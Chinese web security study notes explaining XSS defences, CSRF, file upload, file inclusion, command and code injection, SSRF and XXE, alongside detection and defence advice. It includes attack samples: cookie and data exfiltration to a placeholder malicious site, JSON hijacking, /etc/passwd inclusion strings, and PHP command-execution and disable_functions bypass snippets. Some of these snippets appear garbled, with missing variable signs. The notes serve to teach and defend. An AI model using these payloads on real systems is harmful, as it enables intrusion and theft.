常见恶意字符的HTML编码（显示、实体名字、实体编号）： &lt; &lt;; &amp;#60； > &gt; &amp;#62； &amp; &amp; &amp;#38； “ “ &amp;#34； ‘ ‘ 3、白名单和黑名单结合 4、Noscript ​ Firefox的一款免费的开源插件，默认禁止所有脚本，但是可以通过自定义设置允许通过的脚本。 5、Anti_XSS ​ 提供大量的编码函数用于处理用户的输入，实现白名单机制和输出转义。 6、HttpOnly ​ 攻击者通过XSS漏洞执行JS中的document.cookie方法来窃取用户的cookie信息。Web应用程序在Set-Cookie时将其属性设为HttpOnly即可避免Cookie被客户端JS存取，也可以保护用户的Cookie信息不被盗取。 ​ PHP设置HttpOnly的方法： ​ （1） 修改php.ini文件，设置其值为1或TRUE； ​ （2） setcookie()函数和setrawcookie()函数的第七个参数； ​ （3）在PHP代码中开启。 7、Web安全编码规范 ​ 对敏感字符转义、URL属性进行相应的规定等。 8、尽量使用WAF 9、防御DOM型XSS DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于： （1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现； （2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到 1&lt;script&gt; 则进行JS编码。 CSRF（跨站请求伪造）一、基本概念漏洞定义 跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。 成因 由于程序员的不严谨导致Web应用程序存在漏洞 Web浏览器对Cookie和HTTP身份验证等会话信息的处理存在缺陷 漏洞利用的前提 用户已经完成身份认证 新请求的提交不需要重新身份认证或确认机制 攻击者必须了解Web APP请求的参数构 用户会被吸引去点击链接 CSRF与XSS的区别与关系 XSS主要利用用户对站点的信任，而CSRF主要是利用站点对已知身份认证的信任。换句话说，XSS是用户自己点击链接来访问相应的网页的，而CSRF是在用户并不知情的情况下来提交请求的。另外，两者的产生的原因也不一样，CSRF的是因为采用了隐式的认证方式，而XSS的是因为对用户输入没有进行有效的过滤。 两者均利用用户的会话执行某些操作；若一个站点存在XSS漏洞，则很大可能也存在CSRF漏洞；若CSRF的恶意代码存在于第三方的站点，即使能有效地过滤用户的输入而防止XSS，也未必能防御CSRF。 攻击方式 GET型与POST型CSRF：主要取决于相应操作对提交方式的限制，其原理都是事先构造出一个恶意的请求，然后诱导用户点击或访问，从而假借用户身份完成相应的操作。另外，有些POST型CSRF也可能会利用javascript进行自动提交表单完成操作。 Flash型CSRF：通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如: Flash跨域权限管理文件设置为允许所有主机/域名跨域对本站进行读写数据： 1234This XML file does not appear to have any style information associated with it. The document tree is shown below.&lt;cross-domain-policy&gt; &lt;allow-access-from domain="*"/&gt;&lt;/cross-domain-policy&gt; Flash跨域权限管理文件过滤规则不严(domain=”*”)，导致可以从其它任何域传Flash产生CSRF。 CSRF蠕虫：CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如：某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大！ 二、CSRF攻击获取数据的方法要获取的关键数据：用户 id、用户昵称、用户 email、用户个人页面地址等。 同域内 CSRF 攻击获取数据几乎没任何限制。 跨域 CSRF 攻击获取数据的几种方法总结如下： 1、结合XSS 组合漏洞 利用XSS 获取数据，如之前关于XSS文章做的三方的演示，使用目标站点上的XSS 漏洞： 1&lt;iframe width=0 height=0 src=‘http://目标站点/search.php?k=“&gt;&lt;script src=http://恶意站点/get.js&gt;&lt;/script&gt;’&gt;&lt;/iframe&gt; 其中get.js 的代码为： 12//use DOM method to get your datanew Image(). src=‘http://恶意站点/a.php?data=‘+data; 恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。 2、JSON Hijacing 目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。 相关代码： 12345&lt;script&gt; function hijack(o)&#123;//use DOM method to get your datanew Image().src="http://192.168.1.2/JSONHiJack.asp?hi="+escape(data);&#125;&lt;/script&gt;&lt;script src=http://api.fanfou.com/private_messages/inbox.json?callback=hijack&amp;count=2&gt;&lt;/script&gt; 3、Flash AsctionScript（crossdomain.xml） 前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的 AS脚本进行跨域请求。 1234&lt;?xml version="1.0"?&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain="*" /&gt;&lt;/cross-domain-policy&gt; 相关代码： 1234import flash.net.*; var _l = new URLLoader(new URLRequest(“http://目标站点/"));_l.addEventListener(Event.COMPLETE,function()&#123;text1.text = _l.data&#125;);_l.load(); 4、服务端代理技术 三、检测方法最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。另外还需要确认数据包中确实没有含有token字样，即使有也尝试去掉再发包看是否是进行有效的CSRF校验即可。 一些专门针对 CSRF 漏洞进行检测的工具，如CSRFTester，CSRF Request Builder 等。 以 CSRFTester 工具为例，CSRF 漏洞检测工具的测试原理如下：使用 CSRFTester 进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。 四、防御方法1、 服务端的防御 主要有 5 种策略：验证 HTTP的Referer字段、在请求地址中添加 token 并验证、在 HTTP 头中自定义属性并验证、使用POST替代GET等。 （1）、验证 HTTP的Referer字段，在 HTTP 头的Referer字段记录了该 HTTP 请求的来源地址。顺便解决了非法盗链、站外提交等问题。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。 （2）、在请求地址中添加 token 并验证，可以在 HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。抵御 CSRF 攻击的关键在于：在请求中加入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。 （3）、在 HTTP 头中自定义属性并验证，也是使用 token 并进行验证，但并不是把 token以参数的形式置于 HTTP 请求而是放到 HTTP 头中自定义的属性里。通过XMLHttpRequest 这个类，可以一次性给所有该类请求加上 csrftoken 这个 HTTP 头属性，并把token 值放入其中。这样解决了前一种方法在请求中加入 token 的不便，同时，通过这个类请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会通过 Referer 泄露到其他网站。 （4）、严格区分好 POST 与 GET 的数据请求，尽量使用POST来替代GET，如在 asp 中不要使用 Request 来直接获取数据。同时建议不要用 GET 请求来执行持久性操作。 （5）、使用验证码或者密码确认方式，缺点是用户体验差。 2、 用户端的防御 用户的安全意识与良好的上网习惯。 3、 安全设备的防御 有些厂商的安全产品能基于硬件层面对HTTP 头部的 Referer 字段内容进行检查来快速准确的识别 CSRF 攻击。 文件上传漏洞一、基本概念漏洞定义 文件上传漏洞是指由于服务器端对于用户上传部分的控制不严格导致攻击者可以上传一个恶意的文件到服务器。简单点说，就是用户直接或者通过各种绕过方式将WebShell上传到服务器中进而执行利用。 成因 导致文件上传的漏洞的原因较多，主要包括以下几类： 服务器配置不当 开源编辑器上传漏洞 本地文件上传限制被绕过 过滤不严或被绕过 文件解析漏洞导致文件执行 文件路径截断 服务器配置不当 二、文件上传攻击分类1、轻量级检测绕过攻击 （1）绕过javascript 对扩展名的检测： 使用Burpsuite等反向代理工具直接POST数据包到服务端，绕过前端检测，如DVWA中的绕过示例。 （2）绕过服务端对http request 包MIME 类型检测： 使用Burpsuite等反向代理工具伪造POST 数据包到服务端，绕过MIME检测，如DVWA中的绕过示例。 2、文件内容检测绕过攻击 文件加载测试绕过：对文件进行代码注入再配合任意解析调用/漏洞。 3、上传攻击框架漏洞分层以及路径/扩展名检测绕过攻击 轻量级检测绕过攻击 绕过javascript 对扩展名的检测 代码层漏洞 绕过服务端对http request 包MIME 类型检测 代码层漏洞 路径、扩展名检测绕过攻击 黑名单绕过 白名单绕过 文件名大小写绕过名单列表绕过特殊文件名绕过0x00截断绕过.htaccess文件攻击PHP文件包含漏洞Apache解析漏洞IIS解析漏洞Nginx解析漏洞 代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞代码层漏洞应用层漏洞应用层漏洞应用层漏洞 0x00截断绕过PHP文件包含漏洞IIS解析漏洞Nginx解析漏洞 代码层漏洞代码层漏洞应用层漏洞应用层漏洞 4、文件内容检测绕过攻击 文件加载绕过 (代码层漏洞) 攻击手法与环节如图： 三、上传文件中的解析攻击1、直接解析（几乎没有防御） 比如直接上传一个扩展名是.php 的文件，只需要简单地绕过客户端javascript 检测或者服务端MIME 类型检测就行了。 2、配合解析(有一定程度的防御) 可以理解为先将代码注入到服务器上，上传一个带有一句话木马的图片或文件，等待一个解析的配合来实现攻击。 (1)、本地文件包含解析：主要是PHP本地文件包含 (2)、.htaccess文件解析 (3)、Web应用程序解析漏洞以及其原理： 1.Apache 解析漏洞： 解析： test.php.abc（其中abc为任意不属于黑名单且也不属于Apache解析白名单的名称） 描述：一个文件名为x1.x2.x3的文件，Apache 会从x3的位置往x1的位置开始尝试解析，如果x3不属于Apache能解析的扩展名，那么Apache会尝试去解析x2的位置，这样 一直往前尝试，直到遇到一个能解析的扩展名为止。 2.IIS 解析漏洞： 解析：test.asp/abc 或 test.asp;abc 名 或 abc/def.php （其中abc、def都为任意文件名） 描述：IIS6.0在解析asp格式的时候有两个解析漏洞，一个是如果目录名包含”.asp”字符串，那么这个目录下所有的文件都会按照asp去解析，另一个是只要文件名中含有”.asp;”会优先按asp来解析；IIS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL 后面追加上字符串”/任意文件名.php”就会按照php的方式去解析。 3.Nginx 解析漏洞： 解析：abc/def.php 或 abc%00.php （其中abc、def都为任意文件名） 描述：目前Nginx 主要有这两种漏洞，一个是对任意文件名，在后面添加/abc.php 的解析漏洞，如原本文件名是test.jpg则可以添加为test.jpg/x.php进行解析攻击。还有一种是对低版本的Nginx 可以在任意文件名后面添加%00.php 进行解析攻击。 4.解析漏洞总结： Apache的扩展名顺序解析漏洞：Apache自身的漏洞 IIS的asp 解析漏洞：IIS自身的漏洞 Nginx的%00 解析漏洞：Nginx自身的漏洞 php-cgi的默认配置漏洞：这类以CGI 形式调用php的web 应用程序主要出现在IIS和Nginx；而Apache 通常是以module 的形式去调用php，所以很少出现该类型漏洞。 四、检测方法简单点的方法就是直接上传各种类型的文件，再通过Burpsuite修改各个可以绕过的检测内容来检测。 五、防御方法简单的防御方法为：获取文件扩展名进行白名单对比，然后对文件进行重命名。当然若存在解析漏洞等容易被绕过，具体点的防御方法如下： 1、客户端JavaScript检测：通常为检测文件扩展名) 2、服务端MIME 类型检测：检测Content-Type内容) 3、服务端目录路径检测：检测跟path参数相关的内容 4、服务端文件扩展名检测：检测跟文件extension 相关的内容 （1） 黑名单检测： 文件名大小写绕过：如 AsP，pHp。 名单列表绕过：用黑名单里没有的名单，如 asa 或 cer 等。 特殊文件名绕过：比如发送的 http 包里把文件名改成 test.asp. 或 test.asp (后面为空格)，这种命名方式在 Windows系统里是不能直接修改的，需要在Burpsuite等代理中进行修改，然后绕过验证后，会被Windows系统自动去掉后面的点和空格，但也只能用在Windows系统中。 0x00 截断绕过 双扩展名解析绕过攻击： (1)基于Web服务的解析逻辑：如果上传一个文件名为help.asp.123，扩展名123 不在扩展名黑名单中也没在Apache 可解析扩展名列表中，此时会向前搜寻下一个可解析的扩展名，若搜寻到.php，则会以php 执行。 (2) 基于Web服务的解析方式：如果在Apache的conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是test2.php.jpg也会以php 来执行。 危险解析绕过攻击：基于Web服务的解析方式：如果在Apache 的conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是jpg，一样能以php 方式执行。 .htaccess 文件攻击：配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测。 解析调用/漏洞绕过：直接配合上传一个代码注入过的非黑名单文件即可，再利用解析调用/漏洞 （2） 白名单检测： 0x00 截断绕过：如test.asp%00.jpg 的方式进行截断，属于白名单文件，再利用服务端代码的检测逻辑漏洞进行攻击 解析调用/漏洞绕过：直接配合上传一个代码注入过的白名单文件，再利用解析调用/漏洞 .htaccess文件攻击：无论是黑名单还是白名单都可以直接攻击.htaccess 文件 如果PHP 安全没配置好，就可以通过move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的，这样就能任意定义解析名单了。 5、服务端文件内容检测(检测内容是否合法或含有恶意代码) ： （1）文件幻数检测： 主要是检测文件内容开始处的文件幻数，要绕过的话需要在文件开头写上检测的值，比如图片类型的文件幻数如下： JPG文件： GIF文件： PNG文件： 然后在文件幻数后面加上代码即可。 （2）文件相关信息检测： 图像文件相关信息检测常用的就是getimagesize()函数，需要把文件头部分伪造好，就是在幻数的基础上还加了一些文件信息，结构如下： GIF89a 123(...some binary data for image...) &lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) （3）文件加载检测： 一般是调用API 或函数去进行文件加载测试，常见的是图像渲染测试，甚至是进行二次渲染（过滤效果几乎最强）。 对渲染/加载测试的攻击方式：代码注入绕过，可以用图像处理软件对一张图片进行代码注入，但文件结构是完整的，渲染测试基本上都能绕过。用winhex查看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的注释区。 对二次渲染的攻击方式：攻击文件加载器自身，常见的就是溢出攻击，上传恶意文件后服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出；二次渲染相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。 示例代码： 12345678function image_gd_open(file, extension) &#123; extension = str_replace('jpg', 'jpeg', extension); open_func = 'imageCreateFrom'. extension; //函数名变成imageCreateFrompng 之类 if (!function_exists($open_func)) &#123; return FALSE; &#125; return open_func(file); //变成imagecreatefrompng('/tmp/php0lbTOn') &#125; 文件包含漏洞一、基本概念漏洞定义 简单地说，就是在通过函数包含文件时，由于没有对包含的文件名进行有效的过滤处理，被攻击者利用从而导致了包含了Web根目录以外的文件进来，就会导致文件信息的泄露甚至注入了恶意代码。 这里主要针对PHP语言。 PHP中的文件包含函数 include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。 include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。 require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。 文件包含漏洞的一般特征 ?page=a.php ?home=a.html ?file=content 目录遍历（Directory traversal）和文件包含（File include）的一些区别 目录遍历是可以读取web根目录以外的其他目录，根源在于web application的路径访问权限设置不严，针对的是本系统。 文件包含是通过include函数将web根目录以外的目录的文件被包含进来，分为LFI本地文件包含和RFI远程文件包含。 几种经典的测试方法 ?file=../../../../../etc/passwdd ?page=file:///etc/passwd ?home=main.cgi ?page=http://www.a.com/1.php http://1.1.1.1/../../../../dir/file.txt （通过多个../可以让目录回到根目录中然后再进入目标目录） 编码绕过字符过滤 可以使用多种编码方式进行绕过 %00嵌入任意位置 .的利用 二、文件包含漏洞的利用技巧包含漏洞上传技巧： 一般将一句话木马和图片进行绑定上传。 包含读文件： 如http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=x.php 包含写文件： 构造URL：http://10.10.10.128/dvwa/vulnerabilities/fi/?page=php://input，并且提交POST数据为： 1&lt;?php system(&apos;net user&apos;);?&gt; 等 包含日志文件： 当存在PHP本地文件包含漏洞，但无法上传正常文件时，可以利用Apache日志文件。Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中，例如： 1http://10.10.10.128/dvwa/vulnerabilities/fi/?page=../../../../Apache-20\logs\access.log PHP内置的协议： 三、检测方法找到有包含函数的页面，对函数内容进行替换查看结果； 可以使用工具来代替手工的过程，如Kadimus、Burpsuite的插件LFI scanner checks等； 白盒测试时，可以在源代码中查看allow_url_fopen、allow_url_include等敏感函数是否开启。 四、防御方法1、严格判断包含中的参数是否外部可控。 2、路径限制，限制被包含的文件只能在某一个文件夹内，特别是一定要禁止目录跳转字符，如：“../”。 3、基于白名单的包含文件验证，验证被包含的文件是否在白名单中。 4、尽量不要使用动态包含，可以在需要包含的页面固定写好，如：“include(“head.php”)”。 5、可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。 不安全的验证码一、基本概念漏洞定义 验证码问题归类为逻辑漏洞类问题，通常是开发者编写代码时存在设计缺陷、可导致某些特殊情况使得验证码可被绕过，从而使得验证码的防御机制形同虚设。 原理过程 1.客户端发起一个请求 2.服务端响应并创建一个新的 SessionID 同时生成一个随机验证码 3.服务端将验证码和 SessionID 一并返回给客户端 4.客户端提交验证码连同 SessionID 给服务端 5.服务端验证验证码同时销毁当前会话，返回给客户端结果 二、验证码的安全问题客户端问题： 1、 客户端生成验证码：验证码由客户端 JS生成并且仅仅在客户端用JS验证。 2、 验证码输出客户端：输出在HTML中，不应该把验证码的内容发送到客户端 cookie 或输出到response headers的其他字段中。 3、 验证码输出在 cookie 中：有些系统默认不显示验证码，而是在用户校验错误一定次数之后再出现。那如何判断用户已经错误几次了呢？若是如下判断： （1）在 cookie 中写入一个标记，比如 loginErr = 1，后续错误累加 （2）在 session 中写入一个标记，例如 loginErr = 1，后续错误累加 这样问题在于，要是攻击者不带 Cookie 提交 HTTP 请求或不更新 Cookie中 loginErr 的值反复提交，这样程序会因为无从获取 Cookie/sessionID，会认为攻击者是首次访问，从而验证码不会出现。 服务器端问题： 1、 验证码不过期，没有及时销毁会话导致验证码复用 2、 没有进行非空判断 3、 产生的验证码问题集内的答案非常有限 三、检测方法简单的方法，先是手工登录几次，查看是否出现验证码以及验证码是否失效，然后再通过Burpsuite来进一步测试。 四、防御方法1、 强制要求输入验证码，否则必须实施 IP 策略。注意不要被 X-Forwarded-For（用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段） 绕过了。 2、 验证码只能用一次，用完立即过期。 3、 验证码强度增强，使用扭曲、变形、干扰线条、干扰背景色、变换字体等。 4、 大网站最好统一安全验证码，各处使用同一个验证码接口。 命令注入漏洞一、基本概念漏洞定义 当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，达到任意命令执行的效果。 这里以PHP为主，以后在Java分类中会单独总结Java类的漏洞。 成因 程序未严格区分用户输入的内容是数据还是代码。 PHP与命令执行漏洞相关的函数 1、PHP的5种命令执行函数：system()、exec()、passthru()、shell_exec()、运算符 2、命令执行小集： 12345678910111213141516&lt;?phpcmd="system";ob_start(cmd);echo "_GET[cunlide]";ob_end_flush();echo "&lt;br&gt;";system("GET[cunlide]");echo "&lt;br&gt;";echo exec("$GET[cunlide]");echo "&lt;br&gt;";echo shell_exec("_GET[cunlide]");echo "&lt;br&gt;";echo passthru("GET[cunlide]");echo "&lt;br&gt;";echo `$GET[cunlide]`;?&gt; 3、PHP后门木马常用的函数类型： 执行系统命令：system, passthru, shell_exec, exec, popen, proc_open 代码执行与加密：eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13 文件包含与生成：require，require_once，include, include_once，file_get_contents, file_put_contents, fputs, fwrite.htaccess：SetHandler, auto_prepend_file, auto_append_file 二、绕过WAF的方法1、黑白名单测试绕过 2、可用符号替换 3、换行符\n 4、$IFS替换空格 三、绕过disable_functions的方法禁止 webshell 执行命令原理：PHP配置文件里的disable_functions = 配置，用来禁止某些 php 函数。 1、 黑名单绕过 2、 系统组件绕过（Windows）： 12345678&lt;?phpcommand=_POST[a];wsh = new COM('WScript.shell'); // 生成一个 COM 对象exec = wsh-&gt;exec('cmd.exe /c '.command); //调用对象方法来执行命令stdout = exec-&gt;StdOut();stroutput = stdout-&gt;ReadAll();echo $stroutput?&gt; Shell.Application 也可以实现同样的效果。 彻底的解决方案是直接删除 System32 目录下 wshom.ocx 文件。 3、 扩展库绕过：Linux下可通过编译拓展库进行绕过。 防御方法：将dl函数加入disable_function中禁用。 使用PHP突破Disable_functions执行Linux命令：linux 的 webshell 管理员禁用了exec，system，passthru，popen，shell_exec等等 PHP 执行命令函数，导致不能执行命令，php 提供了一个扩展模块功能，使用 dl 函数能包含一个扩展模块。类似.so或者想windows下的 dll 文件。可以自定义函数来调用 linux 命令而无视Disable_functions的限制。 在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给 create_function()执行任意命令。 四、检测方法基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。 基于白盒的测试：查看源代码，搜索PHP中执行系统命令的函数如system、passthru等。 五、防御方法1、尽量不要执行外部的应用程序或命令。 2、使用自定义函数或函数库实现外部应用程序或命令的功能。 3、在执行 system 等命令执行功能的函数前，确定参数内容。 4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“ ;”会被转义为“\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } 5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。 暴力破解一、基本概念漏洞定义 暴力破解其实并不算是漏洞而是设计缺陷，当页面或程序未对请求的数量进行严格的限制时，攻击者可使用字典一直暴力破解用户名密码，导致密码被破解出来的安全风险。 分类 1、C/S架构暴力破解： 主要使用的破解工具Hydra、Bruter、X-scan 2、B/S架构暴力破解： 使用Burpsuite镜像表单爆破 二、检测方法简单粗暴的方法，直接使用Burpsuite进行暴力破解，看看有没有什么防暴破的机制即可。 三、防御方法1、设置复杂的密码 2、采用验证码机制，同时可防范CSRF攻击 3、登陆日志，限制登录次数 4、调用sleep()函数，当登录失败时停止一段时间才允许再次登录，如DVWA的High级的防暴破机制 代码注入一、基本概念漏洞定义 代码注入，与命令注入类似，程序未对用户输入内容进行严格校验从而导致恶意代码注入执行，只不过是注入到特定的编程语言代码中，如PHP的eval注入、HTML页面的JS注入、OGNL注入等。 这里以PHP为主，Java代码会在Java分类中单独总结。 成因 程序未严格区分用户输入的内容是数据还是代码。 PHP中代码注入函数 eval()、assert()、preg_replace()、str_replace()、call_user_func()…等函数。 eval()函数注入攻击，将参数字符串作为PHP 程序代码来执行，用户可以将 PHP 代码保存成字符串的形式，然后传递给 eval 函数执行。 PHP中的assert()、preg_replace()、str_replace()以及call_user_func()函数同样可以实现eval 注入攻击的效果。preg_replace()函数的作用是用来执行常规表达式的查找和替换的，当替换内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。 二、绕过WAF的方法和命令注入类似。 三、检测方法基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。 基于白盒的测试：查看源代码，搜索与执行PHP代码的函数如eval、assert等。 四、防御方法1、尽量不要执行外部的应用程序或命令。 2、使用自定义函数或函数库实现外部应用程序或命令的功能。 3、在执行php中eval()等代码执行功能的函数前，确定参数内容。 4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“ ;”会被转义为“\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } 5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。 SSRF一、基本概念漏洞定义 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后服务器以他的身份来访问其他服务器的资源。 出现漏洞的常见位置 1）分享：通过URL地址分享网页内容 2）转码服务 3）在线翻译 4）图片加载与下载：通过URL地址加载或下载图片 5）图片、文章收藏功能 6）未公开的api实现以及其他调用URL的功能 7）从URL关键字中寻找 二、绕过WAF的方法主要针对URL过滤的绕过。 1、 使用@符号：我们请求http://a.com@b.com与请求http://b.com的结果是一致的； 2、 IP地址转换进制访问：如115.239.210.26 ＝ 16373751032 3、 添加端口号：http://127.0.0.1:8080 4、 使用短链接：http://dwz.cn/11SMa 三、检测方法1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞 2、在页面源码中查找访问的资源地址 ，如果该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞 四、防御方法1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 3、限制请求的端口为http常用的端口，比如，80,443,8080,8090。 4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。 5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。 XML注入一、基本概念漏洞定义 XML是一种可扩展标记语言，可以理解为HTML的扩展语言，一般用于数据存储、数据传输、数据共享，其中DTD文档来解释XML文档。XML必须包含根元素，所有的标签都要闭合，对大小写敏感，并且属性值需要加引号。 XML注入即XXE（XML外部实体注入），是指利用可控的参数或入口来加载不可控的参数或代码，造成不可控的运行结果。 ENTITY实体：如果在XML文档中需要频繁使用某一条数据，可以预先给这个数据起一个别名。即一个ENTITY，然后再在文档中调用它。 XML定义了两种类型的ENTITY，一种在XML文档中使用，另一种在为参数在DTD文件中使用。 定义语法：\&lt;!DOCTYPE 文件名 [ \&lt;!ENTITY 实体名 “实体内容”&gt; ] &gt; 定义好的ENTITY在文档中通过“&amp;实体名;”来使用。 正常来说，DTD分为内部DTD与外部DTD，内部DTD包含在XML文档中,外部DTD则通过URL引用。一个DTD文件是以.dtd结尾的文本文件 。前面还要加上SYSTEM，但是如果此处没有任何过滤，我们完全可以引用系统敏感文件的，前提是页面有回显，否则你只引用了文件但不知道文件内容。 成因： Xfire使用了STAX解析XML导致XML实体注入发生。 1、直接引入XML外部实体 2、未加任何过滤直接parse 漏洞危害： 1、任意文件读取：通过外部实体引用，可以获取文件内容 2、URL请求，SSRF 3、DoS 4、远程代码执行：在PHP开启expect扩展的前提下 二、检测方法盲测：判断request的XML请求是否被解析，可以根据请求头中的“SOAP”字段来判断，也可以根据错误返回中有“SAX”字样。 漏洞挖掘总结：一般为Xfire开发的或者某些wsdl结尾的文件。 1、Service为Xfire 2、明显的XML作为内容的输入点 3、某些以JSON格式的Request 三、防御方法1、禁用外部实体 2、过滤和验证用户提交的XML数据 3、不允许XML中含有任何自己声明的DTD 4、有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可 反序列化漏洞一、基本概念漏洞定义 通常我们定义了一个类的对象，其中保存了一些属性值，为了方便下次可以继续使用在这个对象或者在其他的文件中可以使用该对象，于是就可以调用serialize()函数将该对象序列化为字符串的形式，将该字符串保存起来，等到需要使用该对象时只需将该字符串传过去并调用unserialize()函数对其反序列化即可。 